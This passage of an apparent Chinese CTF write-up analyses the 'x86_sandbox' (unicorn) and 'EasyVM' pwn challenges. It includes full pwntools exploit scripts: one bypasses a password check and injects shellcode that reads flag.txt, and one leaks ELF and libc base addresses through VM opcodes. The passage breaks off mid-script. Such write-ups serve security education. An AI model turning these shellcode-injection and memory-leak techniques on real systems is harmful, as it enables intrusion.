title="Sandbox分析"></a>Sandbox分析</h3><p>我们知道<code>unicorn</code>是作为虚拟机类似的存在，其运行的主程序主要就是<code>xctf_pwn</code>了。题目中给出了其<code>dump</code>文件。首先我们看一下<code>x86_sandbox</code>。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808152440.png" alt="图片无法显示，请联系作者" title=" "><p>我们看到程序首先是读取<code>xctf_pwn.dmp</code>中的二进制数据，如果程序设置了<code>info</code>参数的话，其会输出<code>xctf_pwn</code>中所有的段信息。这一个步相当于初始化了虚拟机<code>x86_sandbox</code>这个对象。（可以有多个虚拟机对象，各个对象互不干扰）</p><p>接着如果设置<code>-debug</code>参数的话，其会添加一个<code>code_hook</code>，我们看一下</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808153851.png" alt="图片无法显示，请联系作者" title=" "><p>这里<code>hook</code>的类型为<code>4</code>，也就是<code>UC_HOOK_CODE</code>，那么每执行一条指令，其就会将<code>RIP</code>打印出来。接着是调用了<code>Disable_file_RDWR</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808154607.png" alt="图片无法显示，请联系作者" title=" "><p>其将<code>sandbox</code>对象中<code>+0x28</code>位置的值置为了<code>0</code>，这里会影响后面的函数。接着添加了<code>system</code>的<code>hook</code>，这个<code>hook</code>的类型是<code>2</code>也就是会<code>hook</code>所有的中断和系统调用。我们看一下具体的<code>callback</code>函数，其根据<code>rax</code>的数值判断当前调用的系统函数，这里我们关注一下<code>rax=2</code>也就是<code>sys_open</code>系统调用，这是程序调用了<code>file_open</code>这个函数</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808155959.png" alt="图片无法显示，请联系作者" title=" "><p>由于之前将<code>sandbox+0x28</code>处设置为了<code>0</code>，因此并不能反会<code>fd</code>，但是文件已经打开了。完成<code>system hook</code>的添加之后，程序输出了所有的寄存器地址，然后启动了虚拟机</p><h3 id="提取程序"><a href="#提取程序" class="headerlink" title="提取程序"></a>提取程序</h3><p>我们可以利用<code>info</code>给出的信息提取。我们将<code>0x400000</code>开始到<code>0x604000</code>结束的内容提取出来，这就是程序的主要内容了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">| .gcc_except_table            |            401e64  |               f5c  |         24 |</span></span><br><span class="line"><span class="string">| debug001                     |      7ffff783b000  |               f88  |       4000 |</span></span><br><span class="line"><span class="string">| .data                        |            603090  |              4fb8  |         10 |</span></span><br><span class="line"><span class="string">| libc_2.23.so                 |      7ffff7475000  |              5008  |     1c0000 |</span></span><br><span class="line"><span class="string">| .fini                        |            4015a4  |            1c5008  |          9 |</span></span><br><span class="line"><span class="string">| .plt                         |            4009f0  |            1c5111  |        100 |</span></span><br><span class="line"><span class="string">| .jcr                         |            602e00  |            1c5211  |          8 |</span></span><br><span class="line"><span class="string">| ld_2.23.so1                  |      7ffff7ffc000  |            1c5219  |       1000 |</span></span><br><span class="line"><span class="string">| ld_2.23.so2                  |      7ffff7ffd000  |            1c6219  |       1000 |</span></span><br><span class="line"><span class="string">| LOAD                         |            400000  |            1c7239  |        9c8 |</span></span><br><span class="line"><span class="string">| .init                        |            4009c8  |            1c7c01  |         1a |</span></span><br><span class="line"><span class="string">| [stack]                      |      7ffffffde000  |            1c7c1b  |      21000 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.21          |      7ffff7a55000  |            1e8c2b  |     172000 |</span></span><br><span class="line"><span class="string">| LOAD2                        |            400af8  |            35ac3b  |          8 |</span></span><br><span class="line"><span class="string">| .fini_array                  |            602df8  |            35ac43  |          8 |</span></span><br><span class="line"><span class="string">| .prgend                      |            6031d8  |            35ac4b  |          1 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.212         |      7ffff7dc7000  |            35ac4c  |       a000 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.213         |      7ffff7dd1000  |            364c4c  |       2000 |</span></span><br><span class="line"><span class="string">| .plt.got                     |            400af0  |            366c4c  |          8 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.211         |      7ffff7bc7000  |            366c54  |       d000 |</span></span><br><span class="line"><span class="string">| ld_2.23.so                   |      7ffff7dd7000  |            373c54  |      26000 |</span></span><br><span class="line"><span class="string">| libgcc_s.so.1                |      7ffff783f000  |            399c54  |      16000 |</span></span><br><span class="line"><span class="string">| libgcc_s.so.11               |      7ffff7a54000  |            3afc54  |       1000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so1                |      7ffff7274000  |            3b0c54  |       2000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so3                |      7ffff7474000  |            3b2c54  |       1000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so2                |      7ffff7473000  |            3b3c54  |       1000 |</span></span><br><span class="line"><span class="string">| debug004                     |      7ffff7ffe000  |            3b4c5c  |       1000 |</span></span><br><span class="line"><span class="string">| xctf_pwn                     |            401e88  |            3b5c74  |        178 |</span></span><br><span class="line"><span class="string">| LOAD1                        |            4009e2  |            3b5dec  |          e |</span></span><br><span class="line"><span class="string">| LOAD3                        |            4015a2  |            3b5dfa  |          2 |</span></span><br><span class="line"><span class="string">| LOAD5                        |            4019a7  |            3b5e04  |          1 |</span></span><br><span class="line"><span class="string">| LOAD4                        |            4015ad  |            3b5e05  |          3 |</span></span><br><span class="line"><span class="string">| LOAD7                        |            602e08  |            3b5e08  |        1f0 |</span></span><br><span class="line"><span class="string">| LOAD6                        |            401a84  |            3b5ff8  |          4 |</span></span><br><span class="line"><span class="string">| [vdso]                       |      7ffff7ffa000  |            3b5ffc  |       2000 |</span></span><br><span class="line"><span class="string">| .text                        |            400b00  |            3b7ffc  |        aa2 |</span></span><br><span class="line"><span class="string">| libc_2.23.so3                |      7ffff7839000  |            3b8b5e  |       2000 |</span></span><br><span class="line"><span class="string">| libc_2.23.so2                |      7ffff7835000  |            3bab5e  |       4000 |</span></span><br><span class="line"><span class="string">| libc_2.23.so1                |      7ffff7635000  |            3beb5e  |       9000 |</span></span><br><span class="line"><span class="string">| .rodata                      |            4015b0  |            3c7b5e  |        3f7 |</span></span><br><span class="line"><span class="string">| .got                         |            602ff8  |            3c7f55  |          8 |</span></span><br><span class="line"><span class="string">| .got.plt                     |            603000  |            3c7f5d  |         90 |</span></span><br><span class="line"><span class="string">| .eh_frame_hdr                |            4019a8  |            3c7fed  |         dc |</span></span><br><span class="line"><span class="string">| .bss                         |            6030a0  |            3c80c9  |        138 |</span></span><br><span class="line"><span class="string">| extern                       |            6031e0  |            3c8201  |         98 |</span></span><br><span class="line"><span class="string">| libm_2.23.so                 |      7ffff716c000  |            3c8299  |     108000 |</span></span><br><span class="line"><span class="string">| [vsyscall]                   |  ffffffffff600000  |            4d0299  |       1000 |</span></span><br><span class="line"><span class="string">| [heap]                       |            604000  |            4d1299  |      32000 |</span></span><br><span class="line"><span class="string">| .init_array                  |            602df0  |            503299  |          8 |</span></span><br><span class="line"><span class="string">| .eh_frame                    |            401a88  |            5032a1  |        3dc |</span></span><br><span class="line"><span class="string">| debug003                     |      7ffff7fe7000  |            50367d  |       6000 |</span></span><br><span class="line"><span class="string">| xctf_pwn3                    |            603278  |            50967d  |        d88 |</span></span><br><span class="line"><span class="string">| xctf_pwn1                    |            602000  |            50a405  |        df0 |</span></span><br><span class="line"><span class="string">| xctf_pwn2                    |            6031d9  |            50b1f5  |          7 |</span></span><br><span class="line"><span class="string">| debug002                     |      7ffff7dd3000  |            50b1fc  |       4000 |</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = data.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">seg = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    t = i.split(<span class="string">&quot;|&quot;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    t = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> t]</span><br><span class="line">    t = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> t[<span class="number">1</span>:]] + t[:<span class="number">1</span>]</span><br><span class="line">    seg.append(t)</span><br><span class="line"></span><br><span class="line">seg.sort()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seg:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i[<span class="number">0</span>]), i[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;recovery_pwn&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;xctf_pwn.dump&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fr:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> seg:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>]&gt;=<span class="number">0x604000</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len of &#123;&#125; is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i[<span class="number">3</span>], i[<span class="number">2</span>]))</span><br><span class="line">        fr.seek(i[<span class="number">1</span>])</span><br><span class="line">        f.write(fr.read(i[<span class="number">2</span>]))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>也可以采用<code>patch</code>的形式，通过将读取内存写入文件的二进制代码写入<code>eh_frame</code>段，<code>hook engine_start</code>的调用至<code>eh_frame</code>段的函数就可以完成程序的<code>dump</code>。</p><h3 id="xctf-pwn分析"><a href="#xctf-pwn分析" class="headerlink" title="xctf_pwn分析"></a>xctf_pwn分析</h3><p>反编译提取出来的程序，我们通过<code>string</code>找到主程序</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808174229.png" alt="图片无法显示，请联系作者" title=" "><p>我们主要关注的是<code>cmp_pass</code>这个函数，</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808174406.png" alt="图片无法显示，请联系作者" title=" "><p>该函数将用户输入的<code>pass</code>转换为<code>16</code>进制，并与<code>cpuid</code>进行比较，若相同则调用<code>v5[0]+1</code>处的函数。否则就会将<code>vtable</code>的地址<code>+1</code>。而当用户输入的<code>pass</code>的总长度大于<code>4</code>且不正确时，程序就会推出。<code>cpuid</code>的产生位于<code>print_cpuid</code>函数中</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808172530.png" alt="图片无法显示，请联系作者" title=" "><p><code>a1+0x18</code>中存储着原始的<code>cpuid</code>数值，通过异或得到输出的<code>machine-code</code>。我们可以通过<code>machine-code</code>反向次序异或，得到原始的<code>cpuid</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;\x1B[1;31;5m &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot; &quot;</span>).strip()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data_int_list = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> data.split(<span class="string">b&quot;-&quot;</span>)]</span><br><span class="line">data_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_int_list:</span><br><span class="line">    data_bytes += p32(i)</span><br><span class="line">data_bytes_list = [i <span class="keyword">for</span> i <span class="keyword">in</span> data_bytes]</span><br><span class="line"><span class="built_in">print</span>(data_bytes)</span><br><span class="line"><span class="built_in">print</span>(data_bytes_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xe</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    data_bytes_list[i]^=data_bytes_list[i+<span class="number">1</span>]</span><br><span class="line">pass_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_bytes_list:</span><br><span class="line">    pass_str += <span class="string">&quot;%02x&quot;</span>%i</span><br><span class="line"><span class="built_in">print</span>(pass_str)</span><br></pre></td></tr></table></figure><p>当我们输入正确的<code>pass</code>的时候，就会调用<code>vtable+1</code>的函数</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808173426.png" alt="图片无法显示，请联系作者" title=" "><p>我们看一下该函数</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808173541.png" alt="图片无法显示，请联系作者" title=" "><p>在<code>sandbox</code>中<code>open</code>的系统调用已经被<code>hook</code>了，文件已经被打开，但是无法返回<code>fd</code>。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808175121.png" alt="图片无法显示，请联系作者" title=" "><p>但是我们注意到<code>401928</code>位置即<code>vtable+0x28</code>处存在一个后门函数</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808174712.png" alt="图片无法显示，请联系作者" title=" "><p>这里会执行用户输入的任意的<code>shellcode</code>。但是我们要想执行这个函数需要将<code>vtable</code>的地址<code>+0x20</code>才行，因此需要输入<code>pass</code>错误<code>0x20</code>次。也就是需要绕过总长度大于<code>4</code>的判断。我们注意到在<code>readpass</code>的时候如果用户输入的是<code>\n</code>，其并不会进入<code>for</code>循环，也就是<code>count</code>永远是<code>0</code>。这就绕过了判断。</p><p>接下来就是如何执行<code>shellcode</code>的问题了。<code>orw</code>操作中<code>open</code>操作文件已经打开只不过是<code>fd</code>没有返回。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./x86_sandbox&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x1B[1;31;5m &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot; &quot;</span>).strip()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data_int_list = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> data.split(<span class="string">b&quot;-&quot;</span>)]</span><br><span class="line">data_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_int_list:</span><br><span class="line">    data_bytes += p32(i)</span><br><span class="line">data_bytes_list = [i <span class="keyword">for</span> i <span class="keyword">in</span> data_bytes]</span><br><span class="line"><span class="built_in">print</span>(data_bytes)</span><br><span class="line"><span class="built_in">print</span>(data_bytes_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xe</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    data_bytes_list[i]^=data_bytes_list[i+<span class="number">1</span>]</span><br><span class="line">pass_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_bytes_list:</span><br><span class="line">    pass_str += <span class="string">&quot;%02x&quot;</span>%i</span><br><span class="line"><span class="built_in">print</span>(pass_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;your password &lt;&lt; &quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your password &lt;&lt; &quot;</span>, pass_str)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;data ptr:&quot;</span>)</span><br><span class="line">buf_address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data&lt;&lt;&quot;</span>, asm(shellcode))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;invoke ptr&lt;&lt;&quot;</span>, <span class="built_in">str</span>(buf_address))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;arg0&lt;&lt;&quot;</span>, <span class="built_in">str</span>(buf_address))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;arg1&lt;&lt;&quot;</span>, <span class="built_in">str</span>(buf_address))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;arg2&lt;&lt;&quot;</span>, <span class="built_in">str</span>(buf_address))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>程序提供了四种方法，其中最为重要的就是<code>start</code>的逻辑</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808215536.png" alt="图片无法显示，请联系作者" title=" "><p>通过<code>0x80</code>我们可以将<code>ptr[n]</code>改写为任意四字节值，而配合<code>0x54</code>和<code>0x53</code>可以实现内存的任意读写。通过<code>0x9</code>和<code>0x11</code>的配合，我们可以泄露<code>0x5655805c</code>处的内容</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808215617.png" alt="图片无法显示，请联系作者" title=" "><p>经过<code>4</code>之后，<code>0x5655805c</code>会被改写为一个<code>elf</code>的地址，这样我们就可以泄露出<code>elf</code>的加载基址，绕过<code>ASLR</code>。通过读取<code>free_got</code>即可以泄露<code>libc</code>基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./EasyVM&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x56555F0A&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x32/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recyle</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bo_exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_elf_address_paylaod = <span class="string">&quot;\x09\x11\x99&quot;</span></span><br><span class="line">gift()</span><br><span class="line">add(leak_elf_address_paylaod)</span><br><span class="line">start()</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - <span class="number">0x6c0</span></span><br><span class="line">log.success(<span class="string">&quot;elf base address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(elf.address)))</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free_address = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 